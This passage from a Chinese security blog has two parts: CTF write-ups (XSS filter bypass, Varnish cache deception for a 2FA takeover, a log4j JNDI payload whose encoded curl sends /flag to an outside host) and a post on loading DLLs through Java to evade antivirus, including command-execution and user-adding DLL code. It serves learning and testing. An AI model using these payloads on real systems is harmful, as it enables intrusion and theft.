href=\"https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai\">https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai</a> </p>\n<p>扫描非常方便，这题非预期，注册两个号，转负数即可</p>\n<p>FLAG：HTB{fl3w_t00_cl0s3_t0_th3_d3cept10n}</p>\n<h1 id=\"Genesis-Wallet’s-Revenge\"><a href=\"#Genesis-Wallet’s-Revenge\" class=\"headerlink\" title=\"Genesis Wallet’s Revenge\"></a>Genesis Wallet’s Revenge</h1><p>修复了负数，来正式的看一下这个题</p>\n<p>/routes/index.js</p>\n<p>注册登录用户就不说了，登录时要求OTP，来个正面图</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518212731980.png\" alt=\"image-20220518212731980\"></p>\n<p>模拟转账功能，send存在一个note，这里可能存在xss</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518212824308.png\" alt=\"image-20220518212824308\"></p>\n<p>来看一下flag的获得条件：用户余额大于1337，而且用户还不能是 icarus，这个就是类似管理员，他的信息存在database.js中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518212308920.png\" alt=\"image-20220518212308920\"></p>\n<p>这个OTP给我留下过挺深印象的：NahamCon CTF 2022 的 Two For One，几乎是一摸一样</p>\n<p>抓包看看转账时，存在一个过滤</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518214521458.png\" alt=\"image-20220518214521458\"></p>\n<p>看一下过滤的功能，使用了 DOMPurify 进行过滤</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518235849023.png\" alt=\"image-20220518235849023\"></p>\n<p>我的思路是通过bypass 这个 xss filter，给 icarus 转账，造成CSRF给我转账，或者更改信息等操作。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#96;&lt;em id&#x3D;&quot;aaa&#96;bbb&quot;&gt;</span><br><span class=\"line\">-&gt;&lt;em id&#x3D;&quot;aaabbb&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;strong&gt;I am trying to be &lt;s&gt;malicious&lt;&#x2F;s&gt; &lt;u&gt;here&lt;&#x2F;u&gt;! &lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&lt;&#x2F;strong&gt;</span><br><span class=\"line\">-&gt; &lt;strong&gt;I am trying to be &lt;s&gt;malicious&lt;&#x2F;s&gt; here! &lt;img src&#x3D;&quot;1&quot;&gt;&lt;&#x2F;strong&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;strong&gt;&lt;&#x2F;p&gt;&lt;a id&#x3D;&quot;&lt;&#x2F;style&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;</span><br><span class=\"line\">-&gt;&lt;strong&gt;&lt;&#x2F;strong&gt;&lt;strong&gt;&lt;a id&#x3D;&quot;&lt;&#x2F;style&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;strong&gt;&lt;&#x2F;p&gt;&lt;a id&#x3D;&quot;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;</span><br><span class=\"line\">-&gt;&lt;strong&gt;&lt;&#x2F;strong&gt;&lt;strong&gt;&lt;a id&#x3D;&quot;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">![](http:&#x2F;&#x2F;test)</span><br><span class=\"line\">-&gt;&lt;img alt&#x3D;&quot;&quot; src&#x3D;&quot;http:&#x2F;&#x2F;test&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">[&lt;a&gt;&lt;img src&#x3D;\\\\ onload&#x3D;1&gt;\\&quot;onerror&#x3D;alert(1)&gt;&lt;&#x2F;a&gt;](http:&#x2F;&#x2F;test)</span><br><span class=\"line\">&#x3D;&gt; &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;test&quot;&gt;&lt;&#x2F;a&gt;&lt;a&gt;&lt;img src&#x3D;&quot;\\&quot;&gt;&quot;onerror&#x3D;alert(1)&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>\n\n<p>一些文章</p>\n<p><a href=\"https://jorianwoltjer.com/blog/post/ctf/nahamcon-ctf-2022/two-for-one\">https://jorianwoltjer.com/blog/post/ctf/nahamcon-ctf-2022/two-for-one</a></p>\n<p><a href=\"https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e\">https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e</a></p>\n<p>xss的过滤器实在是绕不过去，重新看一下附件，发现使用了varnishi作为缓存</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220519151241215.png\" alt=\"image-20220519151241215\"></p>\n<p>立马思路转变，可以尝试web 缓存投毒就不用费力气去bypass filter，很可惜关于这方面知识欠缺，最终放弃这道题目</p>\n<p><strong>复现</strong></p>\n<p>起docker实在是太慢了，只能本地起一个没有varnish的环境，找到一篇wp看看算了</p>\n<p><a href=\"https://h1pmnh.github.io/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/\">https://h1pmnh.github.io/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/</a></p>\n<p>发现这个路由下存在一些问题，只要用户访问这个路由，不管用户有没有扫码验证，都会产生新的OTP然后将新的OTP放到数据库中，也就是说这里如果用户没有保存二维码，用户将直接被拒之门外</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/dasctf-may/image-20220521232612907.png\" alt=\"image-20220521232612907\"></p>\n<p>测试账号访问 /reset-2fa，html中会有这样产生新的认证，生成二维码，如果我们可以获取到bot的这个东西，就相当于有了他的二维码，也就账号接管了，所以现在就是两个方面：1. CSRF 2. 获取bot的html页面</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/dasctf-may/image-20220521233516974.png\" alt=\"image-20220521233516974\"></p>\n<p>也就是说我们要构造的CSRF为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;&quot;&#x2F;reset-2fa&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>那么基于markdown格式就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">![](&#x2F;reset-2fa)</span><br></pre></td></tr></table></figure>\n\n<p>至于bot的html页面，利用Varnish进行web 缓存欺骗</p>\n<p>查看Varnish配置文件，</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/dasctf-may/image-20220521234157498.png\" alt=\"image-20220521234157498\"></p>\n<p>构造 <strong>/reset-2fa?ctf.jpg</strong> 将会被缓存，另外，由于varnish保证host头唯一，bot从127.0.0.1访问，payload也需要修改Host头</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sub vcl_hash &#123;</span><br><span class=\"line\">    hash_data(req.url);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (req.http.host) &#123;</span><br><span class=\"line\">        hash_data(req.http.host);</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        hash_data(server.ip);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return (lookup);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">发送markdown：![](&#x2F;reset-2fa?123.jpg)</span><br><span class=\"line\">访问缓存页面,根据缓存页面生成二维码,伪造登录</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"CheckpointBots\"><a href=\"#CheckpointBots\" class=\"headerlink\" title=\"CheckpointBots\"></a>CheckpointBots</h1><p>JAVA题 :)</p>\n<p>package中有log4j</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220519101714827.png\" alt=\"image-20220519101714827\"></p>\n<p>这里直接token可控，拼接到log中，然后token弄成payload就行了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220520005254332.png\" alt=\"image-20220520005254332\"></p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;:&#x2F;&#x2F;150.158.181.145:1389&#x2F;TomcatBypass&#x2F;Command&#x2F;Base64&#x2F;Y3VybCBodHRwOi8vMS4xMTYuMTEwLjYxOjQwMDAgLUYgZmlsZT1AL2ZsYWc%253D&#125;       </span><br></pre></td></tr></table></figure>\n\n<p>FLAG：HTB{l0g4j2_g4dg3t_ch4in_55t1_f0r_fun}</p>\n","categories":["赛题wp"]},{"title":"初探java加载动态链接库","url":"/2023/12/25/java-dll/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2F6193d09c503d8e057afa1636_Java%20code%20review%20checklist-min-p-1600.jpeg\" alt=\"6193d09c503d8e057afa1636_Java code review checklist-min-p-1600\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>前两天学习了DLL，又看到了文章，利用java加载动态链接库绕过杀软：<a href=\"http://payloads.online/archivers/2022-08-11/1/\">通过动态链接库绕过反病毒软件Hook - Break JVM</a></p>\n<p>后部分的内容有点深入，所以浅显的学习一下整体思路。环境：jdk1.8_181、win11、vs2022、win10</p>\n<h1 id=\"java加载动态链接库\"><a href=\"#java加载动态链接库\" class=\"headerlink\" title=\"java加载动态链接库\"></a>java加载动态链接库</h1><p>个人理解，java.exe加载动态链接库有什么用？</p>\n<blockquote>\n<p>感觉有点类似白加黑，直接在DLL里调用win-api去执行一些敏感操作，比如添加用户，shellcode执行，可以避免一些cmd的执行，因为现在webshell都是利用cmd.exe去执行。</p>\n</blockquote>\n<p>java加载动态链接库常见有三种方法</p>\n<ul>\n<li>System.load / System.loadLibrary</li>\n<li>Runtime.getRuntime().load / Runtime.getRuntime().loadLibrary</li>\n<li>com.sun.glass.utils.NativeLibLoader.loadLibrary</li>\n</ul>\n<p>前两个的load与loadLibrary有一些区别</p>\n<ul>\n<li>load接收的是绝对路径</li>\n<li>loadLibrary接收的是相对路径，不能含有 <code>\\</code>，可通过目录穿越到达 <strong>jdk安装所在盘或用户环境变量所在盘下的任意路径</strong>，进行加载动态库，调用时不需要动态库的后缀，会自动加上。linux系统应该可以达到任意目录，windows下应该就不行了</li>\n</ul>\n<p>loadDll.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">loadDll</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String path1 = <span class=\"string\">&quot;C:\\\\Users\\\\cys\\\\Desktop\\\\Dll3.dll&quot;</span>;</span><br><span class=\"line\">        String path2 = <span class=\"string\">&quot;../../../../../Dll3&quot;</span>;  <span class=\"comment\">// &quot;../../../../../users/admin/desktop/Dll3&quot;;</span></span><br><span class=\"line\">        RuntimeLoad(path);</span><br><span class=\"line\">        <span class=\"comment\">//NativeLoad(path2);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">RuntimeLoad</span><span class=\"params\">(String path)</span></span>&#123;</span><br><span class=\"line\">        Runtime.getRuntime().load(path);</span><br><span class=\"line\">        <span class=\"comment\">//Runtime.getRuntime().loadLibrary(path);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">SystemLoad</span><span class=\"params\">(String path)</span></span>&#123;</span><br><span class=\"line\">        System.load(path);</span><br><span class=\"line\">        <span class=\"comment\">//System.loadLibrary(path);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">NativeLoad</span><span class=\"params\">(String path)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Class Native = Class.forName(<span class=\"string\">&quot;com.sun.glass.utils.NativeLibLoader&quot;</span>);</span><br><span class=\"line\">        Object c = Native.newInstance();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Native != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            java.lang.reflect.Method Load = Native.getDeclaredMethod(<span class=\"string\">&quot;loadLibrary&quot;</span>,String.class);</span><br><span class=\"line\">            Load.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">            Load.invoke(c,path);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>计算器dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827192556937.png\" alt=\"image-20220827192556937\"></p>\n<h1 id=\"流程分析\"><a href=\"#流程分析\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h1><h2 id=\"Runtime-getRuntime-load\"><a href=\"#Runtime-getRuntime-load\" class=\"headerlink\" title=\"Runtime.getRuntime().load\"></a>Runtime.getRuntime().load</h2><p>调用了 <strong>Runtime.getRuntime().load0</strong> 方法，在这其中会判断路径是否为 <strong>绝对路径</strong> 然后调用 <strong>ClassLoader#loadLibrary</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827193435766.png\" alt=\"image-20220827193435766\"></p>\n<p>判断系统变量路径是否为空，为空就进行初始化。如果传入路径为 <strong>绝对路径</strong> 则调用 <strong>ClassLoader#loadLibrary0</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827194014259.png\" alt=\"image-20220827194014259\"></p>\n<p><strong>loadLibrary0</strong> 中判断ClassLoader是否加载过该链接库</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827212303815.png\" alt=\"image-20220827212303815\"></p>\n<p>然后实例化 <strong>NativeLibrary</strong> 对象，添加到 nativeLibraryContext 中，然后调用 <strong>load</strong> 方法去加载动态链接库</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827212859147.png\" alt=\"image-20220827212859147\"></p>\n<p>load为native方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827213236449.png\" alt=\"image-20220827213236449\"></p>\n<h2 id=\"System-load\"><a href=\"#System-load\" class=\"headerlink\" title=\"System.load\"></a>System.load</h2><p>直接调用 Runtime.getRuntime().load0 流程同上</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827213836360.png\" alt=\"image-20220827213836360\"></p>\n<h2 id=\"Runtime-getRuntime-loadLibrary\"><a href=\"#Runtime-getRuntime-loadLibrary\" class=\"headerlink\" title=\"Runtime.getRuntime().loadLibrary\"></a>Runtime.getRuntime().loadLibrary</h2><p>调用 <strong>Runtime.getRuntime().loadLibrary0</strong> 判断 传入的path不能含有 <code>\\</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827223333156.png\" alt=\"image-20220827223333156\"></p>\n<p>直接 <strong>ClassLoader.loadLibrary</strong>，这里传入false，代表不是绝对路径， <strong>findLibrary</strong> 去寻找动态库的文件名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827225620127.png\" alt=\"image-20220827225620127\"></p>\n<p>如果没找到，从 <strong>jdk安装路径与用户环境变量路径下</strong>去寻找库， <strong>System.mapLibraryName</strong> 会根据平台自动加上后缀，windows自动在末尾添加 <strong>.dll</strong>，接着调用 <strong>ClassLoader#loadLibrary0</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827230322803.png\" alt=\"image-20220827230322803\"></p>\n<p><strong>findBuiltinLib</strong> 检查是否是内置的动态链接库，<a href=\"https://blog.csdn.net/qq_31865983/article/details/101856630\">Hotspot JNI库文件加载源码解析CSDN博客</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827232241822.png\" alt=\"image-20220827232241822\"></p>\n<p>最后加载</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827231911788.png\" alt=\"image-20220827231911788\"></p>\n<h2 id=\"System-loadLibrary\"><a href=\"#System-loadLibrary\" class=\"headerlink\" title=\"System.loadLibrary\"></a>System.loadLibrary</h2><p>直接调用 Runtime.getRuntime().loadLibrary0 流程同上</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827232454903.png\" alt=\"image-20220827232454903\"></p>\n<h2 id=\"NativeLibLoader-loadLibrary\"><a href=\"#NativeLibLoader-loadLibrary\" class=\"headerlink\" title=\"NativeLibLoader.loadLibrary\"></a>NativeLibLoader.loadLibrary</h2><p>提一嘴为什么反射调用</p>\n<blockquote>\n<p>com.sun.glass.utils.NativeLibLoader反射调用是因为在 jdk\\javafx-src.zip!\\com\\sun\\glass\\utils\\NativeLibLoader.java，在不同的版本的jdk中javafx并不是都存在的。</p>\n</blockquote>\n<p>loadLibraryInternal -&gt;loadLibraryFullPath</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828000908313.png\" alt=\"image-20220828000908313\"></p>\n<p>loadLibraryFullPath 绝对路径会加载成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828001637907.png\" alt=\"image-20220828001637907\"></p>\n<p>loadLibraryFullPath 失败后，遍历环境变量去调用，这里用相对路径，总有一款适合你！</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828001805150.png\" alt=\"image-20220828001805150\"></p>\n<h1 id=\"dll编写\"><a href=\"#dll编写\" class=\"headerlink\" title=\"dll编写\"></a>dll编写</h1><h2 id=\"vs编写\"><a href=\"#vs编写\" class=\"headerlink\" title=\"vs编写\"></a>vs编写</h2><p>直接vs进行编写，见 <a href=\"http://www.yongsheng.site/2022/08/24/DLL%E5%8A%AB%E6%8C%81/\">初探DLL劫持 | Y0ng的博客</a></p>\n<p>但是有一个意外情况，在新的win10虚拟机中，单单调用一个calc的dll竟然失败了，尝试了下发现是，我写的dll需要其他依赖库的支持，但是win10虚拟机中并没有这个库，导致无法加载恶意的dll。解决方法就是vs把其他库一起打包喽，运行库选择 <strong>/MT</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830172612983.png\" alt=\"image-20220830172612983\"></p>\n<p>虽然产生的dll很大，不过也算成功执行了。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830173055178.png\" alt=\"image-20220830173055178\"></p>\n<h2 id=\"JNI-技术\"><a href=\"#JNI-技术\" class=\"headerlink\" title=\"JNI 技术\"></a>JNI 技术</h2><p>慢慢了解到 JNI 技术，</p>\n<ul>\n<li><p>定义一个native修饰的方法</p>\n</li>\n<li><p>使用javah进行编译 </p>\n</li>\n<li><p>编写对应的c语言代码</p>\n</li>\n<li><p>使用gcc编译成dll文件</p>\n</li>\n<li><p>编写一个Java类使用System.loadLibrary方法，加载dll文件并且调用</p>\n</li>\n</ul>\n<p>loadDll.java，定义native方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">loadDll</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String dllpath = <span class=\"string\">&quot;D:\\\\java-sec\\\\Dll\\\\src\\\\cmd.dll&quot;</span>;</span><br><span class=\"line\">        System.load(dllpath);</span><br><span class=\"line\"></span><br><span class=\"line\">        String cmd = exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        System.out.println(cmd);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">native</span> String <span class=\"title\">exec</span><span class=\"params\">(String cmd)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>生成.h文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">javah -cp . loadDll</span><br></pre></td></tr></table></figure>\n\n<p>生成的头文件，loadDll.h</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;jni.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#ifndef _Included_loadDll</span><br><span class=\"line\">#define _Included_loadDll</span><br><span class=\"line\">#ifdef __cplusplus</span><br><span class=\"line\">extern &quot;C&quot; &#123;</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">JNIEXPORT jstring JNICALL Java_loadDll_exec</span><br><span class=\"line\">  (JNIEnv *, jclass, jstring);</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef __cplusplus</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>编写命令执行的c文件，Command.c</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;loadDll.h&quot;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;sys&#x2F;types.h&gt;</span><br><span class=\"line\">#include &lt;unistd.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int execmd(const char *cmd, char *result)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char buffer[1024*12];              &#x2F;&#x2F;定义缓冲区</span><br><span class=\"line\">    FILE *pipe &#x3D; _popen(cmd, &quot;r&quot;); &#x2F;&#x2F;打开管道，并执行命令</span><br><span class=\"line\">    if (!pipe)</span><br><span class=\"line\">        return 0; &#x2F;&#x2F;返回0表示运行失败</span><br><span class=\"line\"></span><br><span class=\"line\">    while (!feof(pipe))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (fgets(buffer, 128, pipe))</span><br><span class=\"line\">        &#123; &#x2F;&#x2F;将管道输出到result中</span><br><span class=\"line\">            strcat(result, buffer);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    _pclose(pipe); &#x2F;&#x2F;关闭管道</span><br><span class=\"line\">    return 1;      &#x2F;&#x2F;返回1表示运行成功</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">JNIEXPORT jstring JNICALL Java_loadDll_exec(JNIEnv *env, jobject class_object, jstring jstr)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    const char *cstr &#x3D; (*env)-&gt;GetStringUTFChars(env, jstr, NULL);</span><br><span class=\"line\">    char result[1024 * 12] &#x3D; &quot;&quot;; &#x2F;&#x2F;定义存放结果的字符串数组</span><br><span class=\"line\">    if (1 &#x3D;&#x3D; execmd(cstr, result))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">       &#x2F;&#x2F; printf(result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    char return_messge[100] &#x3D; &quot;&quot;;</span><br><span class=\"line\">    strcat(return_messge, result);</span><br><span class=\"line\">    jstring cmdresult &#x3D; (*env)-&gt;NewStringUTF(env, return_messge);</span><br><span class=\"line\">    &#x2F;&#x2F;system();</span><br><span class=\"line\"></span><br><span class=\"line\">    return cmdresult;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译为dll</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc -I&quot;%JAVA_HOME%\\include&quot; -I&quot;%JAVA_HOME%\\include\\win32&quot; -shared -o cmd.dll Command.c</span><br></pre></td></tr></table></figure>\n\n<p>加载dll，成功。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830171029376.png\" alt=\"image-20220830171029376\"></p>\n<h1 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h1><p>这方面利用感觉比较多了，添加用户，命令执行，内网穿透，开启远程登录等等。</p>\n<p>在有360情况下添加用户</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830204414971.png\" alt=\"image-20220830204414971\"></p>\n<p>dll中加上微软示例的添加用户代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class=\"line\">#include &quot;pch.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;lmaccess.h&gt;</span><br><span class=\"line\">#include &lt;lmerr.h&gt;</span><br><span class=\"line\">#include &lt;Tchar.h&gt;</span><br><span class=\"line\">#pragma comment(lib,&quot;netapi32.lib&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD CreateAdminUserInternal(void)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tNET_API_STATUS rc;</span><br><span class=\"line\">\tBOOL b;</span><br><span class=\"line\">\tDWORD dw;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUSER_INFO_1 ud;</span><br><span class=\"line\">\tLOCALGROUP_MEMBERS_INFO_0 gd;</span><br><span class=\"line\">\tSID_NAME_USE snu;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD cbSid &#x3D; 256;\t&#x2F;&#x2F; 256 bytes should be enough for everybody :)</span><br><span class=\"line\">\tBYTE Sid[256];</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD cbDomain &#x3D; 256 &#x2F; sizeof(TCHAR);</span><br><span class=\"line\">\tTCHAR Domain[256];</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\">\t&#x2F;&#x2F; Create user</span><br><span class=\"line\">\t&#x2F;&#x2F; http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa370649%28v&#x3D;VS.85%29.aspx</span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmemset(&amp;ud, 0, sizeof(ud));</span><br><span class=\"line\"></span><br><span class=\"line\">\tud.usri1_name &#x3D; (LPWSTR)TEXT(&quot;audit&quot;);\t\t\t\t\t\t&#x2F;&#x2F; username</span><br><span class=\"line\">\tud.usri1_password &#x3D; (LPWSTR)TEXT(&quot;Test123456789!&quot;);\t\t\t\t&#x2F;&#x2F; password</span><br><span class=\"line\">\tud.usri1_priv &#x3D; USER_PRIV_USER;\t\t\t\t\t&#x2F;&#x2F; cannot set USER_PRIV_ADMIN on creation</span><br><span class=\"line\">\tud.usri1_flags &#x3D; UF_SCRIPT | UF_NORMAL_ACCOUNT;\t&#x2F;&#x2F; must be set</span><br><span class=\"line\">\tud.usri1_script_path &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">\trc &#x3D; NetUserAdd(</span><br><span class=\"line\">\t\tNULL,\t\t\t&#x2F;&#x2F; local server</span><br><span class=\"line\">\t\t1,\t\t\t\t&#x2F;&#x2F; information level</span><br><span class=\"line\">\t\t(LPBYTE)&amp;ud,</span><br><span class=\"line\">\t\tNULL\t\t\t&#x2F;&#x2F; error value</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (rc !&#x3D; NERR_Success) &#123;</span><br><span class=\"line\">\t\t_tprintf(_T(&quot;NetUserAdd FAIL %d 0x%08x\\r\\n&quot;), rc, rc);</span><br><span class=\"line\">\t\treturn rc;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\">\t&#x2F;&#x2F; Get user SID</span><br><span class=\"line\">\t&#x2F;&#x2F; 